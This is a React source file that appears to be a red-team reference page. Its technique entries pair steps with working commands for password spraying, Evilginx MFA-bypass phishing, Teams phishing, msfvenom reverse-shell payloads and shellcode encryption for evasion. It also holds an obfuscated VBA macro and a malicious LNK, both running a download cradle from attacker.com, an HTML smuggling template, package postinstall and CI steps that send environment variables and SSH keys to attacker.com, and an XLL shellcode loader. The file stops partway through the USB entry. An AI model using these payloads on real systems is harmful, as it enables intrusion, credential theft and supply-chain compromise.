import React, { useState } from 'react';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import DraggableCardList from '../components/DraggableCardList';
import { usePageStorage } from '../hooks/usePageStorage';
import { X, Plus } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'CREDENTIAL ATTACKS',
    color: 'blue',
    nodes: [
      { title: 'Password Spraying', subtitle: 'OWA • O365 • LDAP • Kerberos • lockout avoidance', id: 'spraying' },
    ]
  },
  {
    header: 'PHISHING',
    color: 'cyan',
    nodes: [
      { title: 'Adversary-in-the-Middle', subtitle: 'Evilginx2 • session cookie theft • MFA bypass', id: 'aitm' },
      { title: 'Evilginx', subtitle: 'Phishlet config • lure creation • token replay', id: 'evilginx' },
      { title: 'GoPhish', subtitle: 'Campaign management • email auth • tracking', id: 'gophish' },
      { title: 'TeamsPhisher', subtitle: 'Teams external messaging • file delivery', id: 'teamsphisher' },
      { title: 'Droplets', subtitle: 'Lightweight phishing infrastructure • VPS setup', id: 'droplets' },
    ]
  },
  {
    header: 'PAYLOAD DEVELOPMENT',
    color: 'purple',
    nodes: [
      { title: 'Shellcode Development', subtitle: 'Donut • sRDI • AES encrypt', id: 'shellcode-dev' },
      { title: 'msfvenom', subtitle: 'Staged/stageless • shellcode • encoders • formats', id: 'msfvenom' },
    ]
  },
  {
    header: 'DELIVERY',
    color: 'orange',
    nodes: [
      { title: 'VBA Macros', subtitle: 'Document_Open • remote template injection', id: 'macros' },
      { title: 'LNK & Shortcut Tricks', subtitle: 'Malicious LNK • icon spoofing • ISO delivery', id: 'lnk' },
      { title: 'HTML Smuggling', subtitle: 'Blob URL • XOR decode • MOTW bypass', id: 'html-smuggling' },
      { title: 'Supply Chain', subtitle: 'Dependency confusion • CI/CD poisoning', id: 'supply-chain' },
      { title: 'OneNote / XLL', subtitle: 'Embedded attachments • Excel add-ins', id: 'onenote-xll' },
    ]
  },
  {
    header: 'PHYSICAL & USB',
    color: 'green',
    nodes: [
      { title: 'Rubber Ducky & HID', subtitle: 'USB HID attack • keystroke inject • DuckyScript', id: 'rubber-ducky' },
      { title: 'Malicious USB Drops', subtitle: 'USB drop attacks • LNK payload • social eng', id: 'usb-drop' },
    ]
  },
];

const techniques = [
  // ── CREDENTIAL ATTACKS ──────────────────────────────────────────────────────
  {
    id: 'spraying',
    title: 'Password Spraying',
    subtitle: 'Test a single password against many accounts to avoid lockout policies',
    tags: ['OWA', 'O365', 'LDAP', 'Kerberos', 'o365spray', 'kerbrute', 'DomainPasswordSpray', 'lockout avoidance'],
    accentColor: 'blue',
    overview: 'Password spraying tests one or a small number of likely passwords across a large set of valid accounts, staying under lockout thresholds. Unlike brute-force, it respects the organisation\'s lockout policy by spacing attempts across the observation window. Effective targets include OWA, Exchange Web Services, O365 login endpoints, Kerberos pre-authentication, and LDAP.',
    steps: [
      'Enumerate the domain password policy: lockout threshold, observation window, reset time',
      'Build a target user list from LinkedIn OSINT, LDAP enum, or kerbrute userenum',
      'Choose candidate passwords: Season+Year (Winter2025!), Company+Year!, Welcome1!, P@ssword1',
      'Spray once per observation window with a safety buffer — never exceed the lockout threshold',
      'For O365: use o365spray against login.microsoftonline.com — Azure Smart Lockout behaves differently',
      'For OWA/EWS: use MailSniper Invoke-PasswordSprayOWA against the Exchange endpoint',
      'For Kerberos (internal): use kerbrute passwordspray — Kerberos failures do NOT increment bad-password counter on most DCs',
    ],
    commands: [
      {
        title: 'Check lockout policy before spraying',
        code: `# From Linux (null session)
crackmapexec smb DC01.corp.local --pass-pol
enum4linux-ng -P DC01.corp.local

# From Windows (domain-joined)
net accounts /domain
# Key: Lockout threshold, Observation window, Reset time`
      },
      {
        title: 'O365 / Azure AD spraying',
        code: `# o365spray — validate tenant, enumerate, spray
python3 o365spray.py --validate --domain target.com
python3 o365spray.py --enum -U users.txt --domain target.com
python3 o365spray.py --spray -U valid_users.txt -p "Winter2025!" \\
  --domain target.com --rate 2 --safe 3

# Fireprox — rotate AWS API Gateway IPs to evade Smart Lockout
git clone https://github.com/ustayready/fireprox
python3 fire.py --command create --api_url https://login.microsoftonline.com`
      },
      {
        title: 'Kerberos / LDAP internal spraying',
        code: `# kerbrute — Kerberos pre-auth spray (does NOT increment bad-password counter)
./kerbrute userenum --dc 10.10.10.1 -d corp.local users.txt
./kerbrute passwordspray --dc 10.10.10.1 -d corp.local users.txt "Winter2025!"

# DomainPasswordSpray — reads AD policy and user list automatically
Import-Module ./DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password "Winter2025!" -Verbose

# CrackMapExec SMB spray (noisy — creates 4625 events)
crackmapexec smb 10.10.10.0/24 -u users.txt -p "Winter2025!" --continue-on-success`
      },
      {
        title: 'netexec (nxc) spraying — SMB, LDAP, WinRM, RDP',
        code: `# ── Check password policy before spraying ──
nxc smb DC01.corp.local -u '' -p '' --pass-pol          # Null session
nxc smb DC01.corp.local -u guest -p '' --pass-pol       # Guest session
nxc ldap DC01.corp.local -u user -p 'Password1' --pass-pol

# ── SMB spray (authenticates to DC or host) ──
nxc smb DC01.corp.local -u users.txt -p "Winter2025!" --continue-on-success
nxc smb DC01.corp.local -u users.txt -p passwords.txt  --no-bruteforce --continue-on-success
# --no-bruteforce = pair user[0] with pass[0], user[1] with pass[1] (1:1 match — safe)

# ── LDAP spray (quieter — fewer 4625 events than SMB) ──
nxc ldap DC01.corp.local -u users.txt -p "Winter2025!" --continue-on-success

# ── WinRM spray (identifies WinRM access directly) ──
nxc winrm 10.10.10.0/24 -u users.txt -p "Winter2025!" --continue-on-success

# ── RDP spray ──
nxc rdp 10.10.10.0/24 -u users.txt -p "Winter2025!" --continue-on-success

# ── MSSQL spray ──
nxc mssql 10.10.10.0/24 -u users.txt -p "Winter2025!" --continue-on-success

# ── crackmapexec equivalents (legacy syntax) ──
crackmapexec smb DC01.corp.local -u users.txt -p "Winter2025!" --continue-on-success
crackmapexec ldap DC01.corp.local -u users.txt -p "Winter2025!" --continue-on-success

# ── Success markers ──
# nxc/cme marks successful auth with [+] and "Pwn3d!" if admin
# Filter results: nxc smb ... | grep '+'`
      }
    ]
  },

  // ── PHISHING ─────────────────────────────────────────────────────────────────
  {
    id: 'aitm',
    title: 'Adversary-in-the-Middle (AiTM) Phishing',
    subtitle: 'Proxy-based phishing that captures session cookies and bypasses MFA entirely',
    tags: ['Evilginx2', 'MFA bypass', 'session cookie', 'phishlet', 'O365', 'reverse proxy'],
    accentColor: 'cyan',
    overview: 'AiTM phishing places a transparent reverse proxy between the victim and the real authentication service. The victim authenticates normally — including completing MFA — while the proxy captures the resulting session cookie. The stolen cookie is already authenticated and MFA-satisfied, so replaying it in a browser bypasses all authentication controls. Evilginx2 is the dominant tool, using phishlets to define per-service proxy rules.',
    steps: [
      'Deploy Evilginx2 on a dedicated VPS — never on the team server',
      'Register a convincing lookalike domain and set A records pointing to the Evilginx2 VPS',
      'Configure Evilginx2: set domain and IPv4, load the appropriate phishlet (o365, okta, etc.)',
      'Enable the phishlet and create a lure URL: lures create o365 && lures get-url 0',
      'Send the lure URL to the target via phishing email or Teams message',
      'Monitor sessions in real time: watch for is_authenticated: true',
      'Extract captured session cookies and import into a browser using Cookie Editor, or use with TokenTactics for API access',
    ],
    commands: [
      {
        title: 'Evilginx2 setup and monitoring',
        code: `# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make

# DNS: A evil-domain.com → VPS_IP, A login.evil-domain.com → VPS_IP

sudo ./evilginx -p ./phishlets
config domain evil-domain.com
config ipv4 YOUR_VPS_IP
phishlets hostname o365 login.evil-domain.com
phishlets enable o365
lures create o365
lures get-url 0

# Monitor sessions
sessions
sessions 1`
      },
      {
        title: 'Post-capture — session hijacking',
        code: `# Browser import: Cookie Editor → Import → paste JSON from sessions output

# TokenTactics — refresh captured tokens
git clone https://github.com/rvrsh3ll/TokenTactics
Import-Module ./TokenTactics.ps1
RefreshTo-MSGraphToken -Domain corp.com -RefreshToken "captured_refresh_token"`
      }
    ]
  },
  {
    id: 'evilginx',
    title: 'Evilginx — Phishlet Configuration & Custom Targets',
    subtitle: 'Configure custom phishlets for any web application beyond the built-in library',
    tags: ['Evilginx', 'phishlet', 'YAML', 'custom phishlet', 'auth_tokens', 'credentials'],
    accentColor: 'cyan',
    overview: 'Evilginx phishlets are YAML configuration files that define how the proxy intercepts authentication for a specific website. A custom phishlet captures auth tokens, session cookies, and credentials for any web application — not just the built-in ones.',
    steps: [
      'Identify the target authentication flow: trace the login sequence, note all relevant cookies and parameters',
      'Create a new phishlet YAML file in the phishlets/ directory following Evilginx phishlet syntax',
      'Define proxy_hosts: the target domain and the subdomain you will serve it from',
      'Define auth_tokens: the cookie or header names that indicate a completed authentication',
      'Define credentials: username and password field selectors to capture plaintext before MFA',
      'Test the phishlet locally with config domain and a staging environment before the engagement',
      'Enable and create lures — use URL shorteners or convincing link descriptions for delivery',
    ],
    commands: [
      {
        title: 'Custom phishlet structure',
        code: `# phishlets/custom_app.yaml
name: 'custom_app'
author: 'operator'
version: '1.0.0'
min_ver: '3.0.0'

proxy_hosts:
  - { phish_sub: 'login', orig_sub: 'login', domain: 'corp-portal.com', session: true, is_landing: true }

auth_tokens:
  - domain: '.corp-portal.com'
    keys: ['session_token', '.ASPXAUTH']
    type: 'cookie'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'corp-portal.com'
  path: '/login'

# Load and test
phishlets hostname custom_app login.evil-domain.com
phishlets enable custom_app
lures create custom_app
lures get-url 0`
      }
    ]
  },
  {
    id: 'gophish',
    title: 'GoPhish — Phishing Campaign Management',
    subtitle: 'Set up and run tracked phishing campaigns with GoPhish and proper email authentication',
    tags: ['GoPhish', 'SPF', 'DKIM', 'DMARC', 'phishing campaign', 'tracking pixel', 'swaks'],
    accentColor: 'cyan',
    overview: 'GoPhish is the standard phishing campaign management framework. It handles email delivery, landing pages, credential capture, and real-time tracking. Proper DNS configuration (SPF, DKIM, DMARC) is essential for inbox delivery.',
    steps: [
      'Configure GoPhish admin server to listen on 127.0.0.1:3333 only — never expose publicly',
      'Set up HTTPS listener with a Let\'s Encrypt cert on the phishing server',
      'Configure DNS: SPF record, DKIM keypair, DMARC (p=none to avoid blocking)',
      'Test deliverability with swaks and mail-tester.com before launching the campaign',
      'Build the landing page: clone the target login page or AiTM proxy URL',
      'Add tracking pixel to email templates to detect opens without clicks',
      'Time the send: Monday 08:00–09:00 or end-of-month for finance pretexts',
    ],
    commands: [
      {
        title: 'GoPhish setup and email authentication',
        code: `# config.json — restrict admin to localhost
{
  "admin_server": { "listen_url": "127.0.0.1:3333", "use_tls": true },
  "phish_server": { "listen_url": "0.0.0.0:443", "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/phish-domain.com/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/phish-domain.com/privkey.pem" }
}

# DNS records
TXT @ "v=spf1 ip4:YOUR_SERVER_IP ~all"
TXT mail._domainkey "v=DKIM1; k=rsa; p=<BASE64_PUBLIC_KEY>"
TXT _dmarc "v=DMARC1; p=none; rua=mailto:dmarc@phish-domain.com"

# Test deliverability
swaks --to test@gmail.com --from ceo@phish-domain.com \\
  --server mail.phish-domain.com --tls \\
  --header "Subject: Urgent: Policy Update"`
      }
    ]
  },
  {
    id: 'teamsphisher',
    title: 'TeamsPhisher — Microsoft Teams Phishing',
    subtitle: 'Deliver phishing lures directly via Teams messages, bypassing email gateways entirely',
    tags: ['TeamsPhisher', 'Teams phishing', 'M365', 'external tenant', 'file delivery', 'Teams bypass'],
    accentColor: 'cyan',
    overview: 'Microsoft Teams phishing bypasses email security gateways entirely. When external tenant communication is permitted (a common default in M365), an attacker-controlled or compromised M365 account can send direct messages containing links or file attachments to any external Teams user.',
    steps: [
      'Obtain a valid M365 account — a free trial tenant, a compromised account, or a purchased account all work',
      'Confirm the target tenant allows external Teams messages',
      'Prepare the payload: an ISO containing a malicious LNK, or a direct link to an AiTM lure',
      'Send lure to all targets in the target list using -l targets.txt',
      'For file delivery: attach the ISO/ZIP directly — Teams allows sharing files from within the chat',
      'Monitor Evilginx sessions or C2 callbacks for successful execution',
    ],
    commands: [
      {
        title: 'TeamsPhisher delivery',
        code: `# Install
git clone https://github.com/Octoberfest7/TeamsPhisher
pip3 install -r requirements.txt

# Send attachment + message to a single target
python3 teamsphisher.py \\
  -u attacker@yourtenant.com \\
  -p "Password123!" \\
  -a /root/IT_Security_Update.iso \\
  -m /root/message.txt \\
  -e target@victim.com

# Send to list with personalization
python3 teamsphisher.py \\
  -u attacker@yourtenant.com \\
  -p "Password123!" \\
  -a /root/IT_Security_Update.iso \\
  -m /root/message.txt \\
  -l /root/targets.txt \\
  --personalize --delay 5 --log

# Preview before live send
python3 teamsphisher.py -u attacker@yourtenant.com -p "Password123!" \\
  -a /root/payload.iso -m /root/message.txt -l /root/targets.txt --preview`
      }
    ]
  },
  {
    id: 'droplets',
    title: 'Droplets — Lightweight Phishing Infrastructure',
    subtitle: 'Rapidly spin up phishing VPS infrastructure with proper DNS, cert, and redirect configuration',
    tags: ['droplets', 'VPS', 'phishing infra', 'DigitalOcean', 'Let\'s Encrypt', 'domain categorisation'],
    accentColor: 'cyan',
    overview: 'A "droplet" in red team context refers to a minimal phishing VPS with a properly configured domain, TLS certificate, and redirect infrastructure. Key disciplines: domain age (6+ months), pre-engagement categorisation, per-campaign infrastructure isolation, and post-campaign teardown.',
    steps: [
      'Register a lookalike domain with 6+ month age: typosquatting, homoglyphs, or plausible subdomains',
      'Point the domain\'s A record to the VPS IP and configure PTR record for the IP',
      'Obtain a Let\'s Encrypt certificate: certbot --standalone -d phish-domain.com',
      'Categorise the domain before the engagement using Bluecoat, Cisco Talos, or Fortiguard URL tools',
      'Configure NGINX: serve phishing page on matching paths, redirect all other requests to a decoy site',
      'Test the domain reputation with URLscan.io and VirusTotal before use',
      'After the engagement: tear down the VPS and release the IP — never reuse phishing infrastructure',
    ],
    commands: [
      {
        title: 'Droplet setup and domain categorisation',
        code: `# Let's Encrypt cert
apt install certbot nginx
certbot --standalone -d yourdomain.com

# NGINX config — phishing + decoy
server {
    listen 443 ssl;
    server_name yourdomain.com;
    location /secure-login { proxy_pass http://127.0.0.1:3333; }
    location / { return 301 https://microsoft.com; }
}

# Categorisation (submit before engagement)
# https://sitereview.bluecoat.com
# https://talosintelligence.com/reputation_center
# https://fortiguard.com/webfilter`
      }
    ]
  },

  // ── PAYLOAD DEVELOPMENT ──────────────────────────────────────────────────────
  {
    id: 'shellcode-dev',
    title: 'Shellcode Development',
    subtitle: 'Generate position-independent shellcode and encrypt it for evasion',
    tags: ['Donut', 'sRDI', 'AES encryption', 'msfvenom', 'position-independent', 'shellcode'],
    accentColor: 'purple',
    overview: 'Shellcode generation converts PE binaries (EXE/DLL) into position-independent shellcode that can be injected into any process. Donut, sRDI, and msfvenom are the primary tools. AES encryption of the generated shellcode prevents static AV detection. The loader decrypts at runtime in memory only — the binary on disk contains no recognisable shellcode.',
    steps: [
      'Generate stageless beacon shellcode from CS or Sliver (Raw/bin output format)',
      'Convert any PE to shellcode with Donut: donut -i beacon.exe -o beacon.bin -a 2 -e 3',
      'Convert a DLL to self-loading shellcode with sRDI: python3 ShellcodeRDI.py beacon.dll',
      'Generate shellcode with msfvenom: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw -o sc.bin',
      'AES-256 encrypt the shellcode offline with Python/Cryptodome',
      'Embed the encrypted shellcode in a loader binary — the binary contains no plaintext shellcode',
    ],
    commands: [
      {
        title: 'Donut / sRDI / msfvenom shellcode generation',
        code: `# Donut — convert EXE/DLL to position-independent shellcode
donut -i beacon.exe -o beacon.bin -a 2 -e 3
# -a 2 = x64  -e 3 = AES-128 encrypt output

# sRDI — convert DLL to self-loading shellcode
git clone https://github.com/monoxgas/sRDI
python3 ShellcodeRDI.py beacon.dll

# msfvenom — generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \\
  LHOST=attacker.com LPORT=443 -f raw -o sc.bin

# AES-256 encrypt shellcode
python3 - << 'PYEOF'
import os, base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
key = os.urandom(32); iv = os.urandom(16)
with open("beacon.bin", "rb") as f: sc = f.read()
enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(sc, 16))
print("key:", base64.b64encode(key).decode())
print("iv: ", base64.b64encode(iv).decode())
with open("beacon_enc.bin", "wb") as f: f.write(enc)
PYEOF

# ThreatCheck — identify bytes triggering AMSI/Defender
ThreatCheck.exe -f loader.exe -e AMSI
ThreatCheck.exe -f loader.exe -e Defender`
      }
    ]
  },
  {
    id: 'msfvenom',
    title: 'msfvenom',
    subtitle: 'Generate shellcode, staged/stageless payloads, and encoded executables for any platform',
    tags: ['msfvenom', 'metasploit', 'shellcode', 'payload', 'reverse_tcp', 'reverse_https', 'encoder', 'staged', 'stageless'],
    accentColor: 'purple',
    overview: 'msfvenom is the Metasploit payload generator and encoder. It produces shellcode, executables, DLLs, scripts, and more for any supported platform and architecture. Key options: -p (payload), -f (format), -a (arch), -e (encoder), -i (encode iterations), -b (bad chars), LHOST/LPORT.',
    steps: [
      'List all payloads: msfvenom -l payloads | grep windows',
      'Choose staged (windows/x64/meterpreter/reverse_https) vs stageless (windows/x64/meterpreter_reverse_https) — staged requires a Metasploit listener; stageless is self-contained',
      'Always specify architecture (-a x64) and platform (--platform windows) explicitly',
      'Use -f raw for shellcode to embed in a loader; use -f exe for a standalone binary',
      'Apply an encoder (-e x64/xor_dynamic) with multiple iterations (-i 10) to defeat static signatures',
      'Exclude bad characters with -b "\\x00\\x0a\\x0d" when injecting into specific contexts',
      'Start the matching multi/handler in Metasploit before delivering the payload',
    ],
    commands: [
      {
        title: 'Common msfvenom payload generation',
        code: `# Raw shellcode (x64) — embed in a custom loader
msfvenom -p windows/x64/meterpreter/reverse_https \\
  LHOST=attacker.com LPORT=443 \\
  -a x64 --platform windows \\
  -f raw -o beacon.bin

# Stageless shellcode — no handler dependency
msfvenom -p windows/x64/meterpreter_reverse_https \\
  LHOST=attacker.com LPORT=443 \\
  -a x64 --platform windows \\
  -f raw -o beacon_stageless.bin

# Standalone EXE (stageless)
msfvenom -p windows/x64/meterpreter_reverse_https \\
  LHOST=attacker.com LPORT=443 \\
  -a x64 --platform windows \\
  -f exe -o payload.exe

# DLL payload
msfvenom -p windows/x64/meterpreter/reverse_https \\
  LHOST=attacker.com LPORT=443 \\
  -a x64 --platform windows \\
  -f dll -o payload.dll

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \\
  LHOST=attacker.com LPORT=4444 \\
  -a x64 --platform linux \\
  -f elf -o shell.elf`
      },
      {
        title: 'Encoding and bad character exclusion',
        code: `# Encode with xor_dynamic (10 iterations) — evades basic static sigs
msfvenom -p windows/x64/meterpreter/reverse_https \\
  LHOST=attacker.com LPORT=443 \\
  -a x64 --platform windows \\
  -e x64/xor_dynamic -i 10 \\
  -f raw -o encoded.bin

# Exclude bad characters (null, newline, carriage return)
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=attacker.com LPORT=4444 \\
  -b "\\x00\\x0a\\x0d" \\
  -f c -o shellcode.c

# List encoders
msfvenom -l encoders | grep x64

# List formats
msfvenom --list formats`
      },
      {
        title: 'Metasploit multi/handler (catch the callback)',
        code: `# Start handler in msfconsole
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Or one-liner
msfconsole -q -x "use multi/handler; \\
  set payload windows/x64/meterpreter/reverse_https; \\
  set LHOST 0.0.0.0; set LPORT 443; \\
  set ExitOnSession false; exploit -j"`
      }
    ]
  },

  // ── DELIVERY ─────────────────────────────────────────────────────────────────
  {
    id: 'macros',
    title: 'VBA Macros & Remote Template Injection',
    subtitle: 'Deliver beacons via malicious Office documents using macros and template injection',
    tags: ['VBA', 'Document_Open', 'AutoOpen', 'remote template', 'AMSI bypass', '.docm'],
    accentColor: 'orange',
    overview: 'VBA macros execute arbitrary code when an Office document is opened and macros are enabled. Remote template injection is a stealthier alternative: a .docx contains no macros and passes static gateway inspection, but references a remote .dotm at open time — Word silently fetches the .dotm which contains the macros.',
    steps: [
      'Create a .docm with a Document_Open sub that executes a download cradle via WMI (Win32_Process.Create)',
      'Obfuscate the macro: split strings, use Chr() encoding to avoid static string detection',
      'Test against Windows Defender + AMSI in an offline VM before delivery',
      'For remote template: create a clean .docx, edit word/_rels/settings.xml.rels to add an external template relationship',
      'Repack the .docx with the zip CLI (not Windows Explorer) and host the .dotm on the redirector',
      'Log HTTP requests for the .dotm to confirm document was opened before any click',
    ],
    commands: [
      {
        title: 'VBA macro — WMI download cradle',
        code: `Sub Document_Open()
    Dim p1 As String: p1 = "pow" & Chr(101) & "rsh" & Chr(101) & "ll"
    Dim url As String: url = "http" & Chr(115) & "://attacker.com/s.ps1"
    Dim oWMI As Object
    Set oWMI = GetObject("winmgmts:\\.\\root\\cimv2:Win32_Process")
    oWMI.Create p1 & " -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('" & url & "')"
End Sub
Sub AutoOpen(): Document_Open: End Sub`
      },
      {
        title: 'Remote Template Injection',
        code: `# 1. Unzip a clean .docx
mkdir lure_extracted && cp lure.docx lure_extracted/lure.zip
cd lure_extracted && unzip lure.zip && rm lure.zip

# 2. Edit word/_rels/settings.xml.rels — add external template relationship
# Target="https://attacker.com/templates/corp_template.dotm"

# 3. Repack
cd lure_extracted && zip -r ../lure_final.docx . -x "*.DS_Store"

# When victim opens lure_final.docx → Word fetches .dotm → macros execute`
      }
    ]
  },
  {
    id: 'lnk',
    title: 'LNK Files & Shortcut Tricks',
    subtitle: 'Malicious Windows shortcut files that execute payloads when double-clicked',
    tags: ['LNK', 'shortcut', 'icon spoofing', 'PowerShell LNK', 'ISO delivery', 'MOTW bypass'],
    accentColor: 'orange',
    overview: 'LNK files are Windows shortcut files (.lnk) that can execute arbitrary commands through their Target and Arguments fields, while displaying a completely different icon to the user. The command is invisible in Windows Explorer. LNK files delivered inside a ZIP or ISO bypass MOTW on older Windows versions.',
    steps: [
      'Create LNK with Target set to powershell.exe and Arguments containing the download cradle',
      'Set the IconLocation to a legitimate application (Word, PDF, Excel) icon',
      'Set WindowStyle to 7 (minimized) so no window appears on execution',
      'Deliver inside an ISO to bypass MOTW on pre-2022 patched Windows 10',
      'Verify the LNK with CreateShortcut() read-back before delivery',
    ],
    commands: [
      {
        title: 'Generate malicious LNK (PowerShell)',
        code: `$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("Invoice_Q1.lnk")
$lnk.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
$lnk.Arguments = '-nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''https://attacker.com/s.ps1'')"'
$lnk.IconLocation = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE,0"
$lnk.WindowStyle = 7
$lnk.Save()`
      },
      {
        title: 'LNK delivery in ISO (MOTW bypass)',
        code: `# Package LNK inside ISO
mkdir payload_dir
cp Invoice_Q1.lnk payload_dir/
mkisofs -o delivery.iso -J -R payload_dir/

# User opens ISO → mounts it → sees Word icon → double-click → beacon fires`
      }
    ]
  },
  {
    id: 'html-smuggling',
    title: 'HTML Smuggling',
    subtitle: 'Encode payload inside JavaScript Blob to bypass email and web gateways',
    tags: ['HTML smuggling', 'Blob URL', 'createObjectURL', 'base64', 'XOR decrypt', 'gateway bypass'],
    accentColor: 'orange',
    overview: 'HTML smuggling embeds a payload as a base64 (or XOR-encoded) string inside an HTML file\'s JavaScript. When opened in a browser, the JavaScript decodes the payload, creates a Blob, constructs an object URL, and clicks an anchor element to trigger automatic file download. Email and web gateways scan static content and cannot execute JavaScript — they see only the HTML wrapper.',
    steps: [
      'Encode the payload (ISO, ZIP, EXE) as base64',
      'XOR-encrypt the base64 payload with a key to further defeat gateway content inspection',
      'Insert the encoded payload into the HTML template as a JavaScript variable',
      'Use atob() + Uint8Array + Blob + URL.createObjectURL + a.click() to trigger automatic download',
      'Set a.download to a convincing filename: "IT_Security_Update.iso"',
      'Wrap the entire trigger in window.onload so it fires immediately on open',
    ],
    commands: [
      {
        title: 'HTML smuggling template',
        code: `<!-- invoice.html — auto-downloads payload when opened -->
<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
<script>
function b64ToBytes(b64) {
  var bin = atob(b64), bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}
function xorDecrypt(bytes, key) {
  var k = new TextEncoder().encode(key);
  return bytes.map(function(b, i) { return b ^ k[i % k.length]; });
}
window.onload = function() {
  var enc = "BASE64_XOR_ENCODED_PAYLOAD_HERE";
  var key = "ChangeThisKey42";
  var dec = xorDecrypt(b64ToBytes(enc), key);
  var blob = new Blob([dec], {type:"application/octet-stream"});
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob); a.download = "IT_Security_Update.iso";
  document.body.appendChild(a); a.click();
};
</script></body></html>`
      },
      {
        title: 'Python payload encoder',
        code: `#!/usr/bin/env python3
import base64
PAYLOAD_FILE = "payload.iso"
XOR_KEY = "ChangeThisKey42"
with open(PAYLOAD_FILE, "rb") as f: raw = f.read()
key_bytes = XOR_KEY.encode()
xored = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(raw)])
b64 = base64.b64encode(xored).decode()
# Paste b64 into BASE64_XOR_ENCODED_PAYLOAD_HERE in the HTML template`
      }
    ]
  },
  {
    id: 'supply-chain',
    title: 'Supply Chain Attacks',
    subtitle: 'Compromise via dependency confusion, CI/CD poisoning, or third-party package manipulation',
    tags: ['dependency confusion', 'npm', 'PyPI', 'CI/CD', 'GitHub Actions', 'Jenkins', 'build pipeline'],
    accentColor: 'orange',
    overview: 'Supply chain attacks compromise targets indirectly by poisoning the software packages or build pipelines they depend on. Dependency confusion exploits the fact that most package managers prefer the highest available version — registering a public package with the same name as an internal one at a higher version causes developer machines and CI/CD pipelines to pull the malicious package.',
    steps: [
      'Find internal package names in target GitHub repos (package.json, requirements.txt, go.mod)',
      'Verify the internal package name is NOT on the public registry',
      'Create a package with the exact same name at version 99.9.9 with malicious postinstall code',
      'The postinstall exfiltrates environment variables (AWS keys, deploy tokens) to the attacker server',
      'Publish to PyPI/npm — the package manager prefers the public version at the higher version number',
      'For CI/CD: append a malicious step to .github/workflows/*.yml that exfils env vars',
      'Monitor the attacker server for callbacks confirming installation',
    ],
    commands: [
      {
        title: 'Dependency confusion attack',
        code: `# Find internal package names
# GitHub: org:TargetCorp package.json

# Verify not on public registry
pip index versions internal-package-name 2>&1 | grep "No matching distribution"
npm view internal-package-name 2>&1 | grep "404"

# Malicious PyPI postinstall
def exfil():
    import urllib.request, json, os, socket
    data = json.dumps({"pkg":"internal-pkg","env":dict(os.environ)}).encode()
    urllib.request.urlopen("https://attacker.com/callback", data=data, timeout=5)
exfil()

# Publish
pip install build twine && python -m build && twine upload dist/*`
      },
      {
        title: 'CI/CD pipeline poisoning (GitHub Actions)',
        code: `# Inject malicious step into existing workflow
- name: Update Cache
  run: |
    curl -s -X POST https://attacker.com/exfil \\
      -d "{\\"env\\": \\"$(env | base64 -w0)\\"}"

# Expression injection via PR title
# Vulnerable: run: echo "\${{ github.event.pull_request.title }}"
# PR title payload: "; curl attacker.com/$(cat ~/.ssh/id_rsa|base64)"`
      }
    ]
  },
  {
    id: 'onenote-xll',
    title: 'OneNote Attachments & XLL Excel Add-ins',
    subtitle: 'Deliver payloads via OneNote embedded files and Excel XLL add-ins',
    tags: ['OneNote', '.one', 'XLL', 'Excel add-in', 'xlAutoOpen', 'embedded attachment'],
    accentColor: 'orange',
    overview: 'After Microsoft disabled VBA macros from internet-sourced Office files by default in 2022, attackers shifted to formats without the same restrictions. OneNote (.one) files can embed arbitrary file attachments that execute when double-clicked. XLL files are Excel add-ins that call an exported xlAutoOpen function when loaded.',
    steps: [
      'For OneNote: open OneNote Desktop, create a page, insert a file attachment with your .hta or .exe payload',
      'Add a convincing image overlay: "Double-click to open document" over the attachment icon',
      'Export as .one file and deliver via email',
      'For XLL: compile a DLL exporting xlAutoOpen() that executes shellcode — rename .dll to .xll',
      'Deliver .xll via email or file share — Excel loads it as an add-in and calls xlAutoOpen automatically',
    ],
    commands: [
      {
        title: 'XLL Excel add-in payload',
        code: `// xll_payload.c — minimal XLL executing shellcode via xlAutoOpen
// Compile: x86_64-w64-mingw32-gcc -shared -o invoice.xll xll_payload.c -lkernel32 -s

#include <windows.h>
unsigned char enc_shellcode[] = { /* encrypted shellcode */ };
unsigned int  shellcode_len   = sizeof(enc_shellcode);

__declspec(dllexport) int __cdecl xlAutoOpen(void) {
    LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 0;
    memcpy(mem, enc_shellcode, shellcode_len);
    DWORD old;
    VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    return 1;
}
__declspec(dllexport) int __cdecl xlAutoClose(void) { return 1; }
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }`
      }
    ]
  },

  // ── PHYSICAL & USB ───────────────────────────────────────────────────────────
  {
    id: 'rubber-ducky',
    title: 'Rubber Ducky & HID Keystroke Injection',
    subtitle: 'Emulate a USB keyboard to execute arbitrary commands — bypasses all software security controls',
